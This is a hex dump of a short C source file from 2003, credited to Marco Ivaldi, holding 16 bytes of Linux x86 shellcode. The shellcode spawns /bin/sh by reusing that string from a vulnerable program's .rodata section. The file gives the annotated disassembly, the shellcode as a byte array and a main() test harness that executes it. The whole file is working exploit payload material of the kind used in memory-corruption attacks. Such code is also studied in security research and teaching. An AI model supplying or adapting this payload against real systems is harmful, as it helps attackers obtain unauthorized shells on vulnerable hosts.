00000000  2f 2a 0d 0a 20 2a 20 24  49 64 3a 20 72 65 75 73  |/*.. * $Id: reus|
00000010  61 67 65 2d 6c 69 6e 75  78 2e 63 2c 76 20 31 2e  |age-linux.c,v 1.|
00000020  33 20 32 30 30 34 2f 30  31 2f 33 30 20 32 30 3a  |3 2004/01/30 20:|
00000030  30 38 3a 34 36 20 72 61  70 74 6f 72 20 45 78 70  |08:46 raptor Exp|
00000040  20 24 0d 0a 20 2a 0d 0a  20 2a 20 72 65 75 73 61  | $.. *.. * reusa|
00000050  67 65 2d 6c 69 6e 75 78  2e 63 20 2d 20 72 65 2d  |ge-linux.c - re-|
00000060  75 73 65 20 6f 66 20 22  2f 62 69 6e 2f 73 68 22  |use of "/bin/sh"|
00000070  20 73 74 72 69 6e 67 20  69 6e 20 2e 72 6f 64 61  | string in .roda|
00000080  74 61 0d 0a 20 2a 20 43  6f 70 79 72 69 67 68 74  |ta.. * Copyright|
00000090  20 28 63 29 20 32 30 30  33 20 4d 61 72 63 6f 20  | (c) 2003 Marco |
000000a0  49 76 61 6c 64 69 20 3c  72 61 70 74 6f 72 40 30  |Ivaldi <raptor@0|
000000b0  78 64 65 61 64 62 65 65  66 2e 69 6e 66 6f 3e 0d  |xdeadbeef.info>.|
000000c0  0a 20 2a 0d 0a 20 2a 20  53 68 6f 72 74 20 6c 6f  |. *.. * Short lo|
000000d0  63 61 6c 20 73 68 65 6c  6c 63 6f 64 65 20 66 6f  |cal shellcode fo|
000000e0  72 20 2f 62 69 6e 2f 73  68 20 65 78 65 63 76 65  |r /bin/sh execve|
000000f0  28 29 2e 20 49 74 20 72  65 2d 75 73 65 73 20 74  |(). It re-uses t|
00000100  68 65 20 22 2f 62 69 6e  2f 73 68 22 0d 0a 20 2a  |he "/bin/sh".. *|
00000110  20 73 74 72 69 6e 67 20  73 74 6f 72 65 64 20 69  | string stored i|
00000120  6e 20 74 68 65 20 2e 72  6f 64 61 74 61 20 73 65  |n the .rodata se|
00000130  63 74 69 6f 6e 20 6f 66  20 74 68 65 20 76 75 6c  |ction of the vul|
00000140  6e 65 72 61 62 6c 65 20  70 72 6f 67 72 61 6d 2e  |nerable program.|
00000150  20 43 68 61 6e 67 65 0d  0a 20 2a 20 74 68 65 20  | Change.. * the |
00000160  73 74 72 69 6e 67 20 61  64 64 72 65 73 73 20 61  |string address a|
00000170  73 20 6e 65 65 64 65 64  20 28 62 61 73 65 64 20  |s needed (based |
00000180  6f 6e 20 7a 69 6c 6c 69  6f 6e 27 73 20 6f 72 69  |on zillion's ori|
00000190  67 69 6e 61 6c 20 69 64  65 61 29 2e 0d 0a 20 2a  |ginal idea)... *|
000001a0  2f 0d 0a 0d 0a 2f 2a 0d  0a 20 2a 20 65 78 65 63  |/..../*.. * exec|
000001b0  76 65 28 22 2f 62 69 6e  2f 73 68 22 2c 20 5b 22  |ve("/bin/sh", ["|
000001c0  2f 62 69 6e 2f 73 68 22  5d 2c 20 4e 55 4c 4c 29  |/bin/sh"], NULL)|
000001d0  0d 0a 20 2a 0d 0a 20 2a  20 38 30 34 39 33 36 38  |.. *.. * 8049368|
000001e0  3a 20 20 20 20 20 20 20  33 31 20 63 30 20 20 20  |:       31 c0   |
000001f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000200  78 6f 72 20 20 20 20 25  65 61 78 2c 25 65 61 78  |xor    %eax,%eax|
00000210  0d 0a 20 2a 20 38 30 34  39 33 36 61 3a 20 20 20  |.. * 804936a:   |
00000220  20 20 20 20 62 62 20 30  38 20 38 34 20 30 34 20  |    bb 08 84 04 |
00000230  30 38 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |08          mov |
00000240  20 20 20 24 30 78 38 30  34 38 34 30 38 2c 25 65  |   $0x8048408,%e|
00000250  62 78 20 23 20 63 68 61  6e 67 65 20 69 74 0d 0a  |bx # change it..|
00000260  20 2a 20 38 30 34 39 33  36 66 3a 20 20 20 20 20  | * 804936f:     |
00000270  20 20 35 33 20 20 20 20  20 20 20 20 20 20 20 20  |  53            |
00000280  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 20  |          push  |
00000290  20 25 65 62 78 0d 0a 20  2a 20 38 30 34 39 33 37  | %ebx.. * 804937|
000002a0  30 3a 20 20 20 20 20 20  20 38 39 20 65 31 20 20  |0:       89 e1  |
000002b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002c0  20 6d 6f 76 20 20 20 20  25 65 73 70 2c 25 65 63  | mov    %esp,%ec|
000002d0  78 0d 0a 20 2a 20 38 30  34 39 33 37 32 3a 20 20  |x.. * 8049372:  |
000002e0  20 20 20 20 20 33 31 20  64 32 20 20 20 20 20 20  |     31 d2      |
000002f0  20 20 20 20 20 20 20 20  20 20 20 20 20 78 6f 72  |             xor|
00000300  20 20 20 20 25 65 64 78  2c 25 65 64 78 0d 0a 20  |    %edx,%edx.. |
00000310  2a 20 38 30 34 39 33 37  34 3a 20 20 20 20 20 20  |* 8049374:      |
00000320  20 62 30 20 30 62 20 20  20 20 20 20 20 20 20 20  | b0 0b          |
00000330  20 20 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |         mov    |
00000340  24 30 78 62 2c 25 61 6c  0d 0a 20 2a 20 38 30 34  |$0xb,%al.. * 804|
00000350  39 33 37 36 3a 20 20 20  20 20 20 20 63 64 20 38  |9376:       cd 8|
00000360  30 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0               |
00000370  20 20 20 20 69 6e 74 20  20 20 20 24 30 78 38 30  |    int    $0x80|
00000380  0d 0a 20 2a 20 38 30 34  39 33 37 38 3a 20 20 20  |.. * 8049378:   |
00000390  20 20 20 20 30 30 20 30  30 20 20 20 20 20 20 20  |    00 00       |
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 61 64 64 20  |            add |
000003b0  20 20 20 25 61 6c 2c 28  25 65 61 78 29 0d 0a 20  |   %al,(%eax).. |
000003c0  2a 2f 0d 0a 0d 0a 63 68  61 72 20 73 63 5b 5d 20  |*/....char sc[] |
000003d0  3d 20 2f 2a 20 31 36 20  62 79 74 65 73 20 2a 2f  |= /* 16 bytes */|
000003e0  0d 0a 22 5c 78 33 31 5c  78 63 30 5c 78 62 62 5c  |.."\x31\xc0\xbb\|
000003f0  78 30 38 5c 78 38 34 5c  78 30 34 5c 78 30 38 5c  |x08\x84\x04\x08\|
00000400  78 35 33 5c 78 38 39 5c  78 65 31 5c 78 33 31 5c  |x53\x89\xe1\x31\|
00000410  78 64 32 5c 78 62 30 5c  78 30 62 5c 78 63 64 5c  |xd2\xb0\x0b\xcd\|
00000420  78 38 30 22 3b 0d 0a 0d  0a 6d 61 69 6e 28 29 0d  |x80";....main().|
00000430  0a 7b 0d 0a 09 69 6e 74  20 28 2a 66 29 28 29 20  |.{...int (*f)() |
00000440  3d 20 28 69 6e 74 20 28  2a 29 28 29 29 73 63 3b  |= (int (*)())sc;|
00000450  20 66 28 29 3b 0d 0a 7d                           | f();..}|
00000458
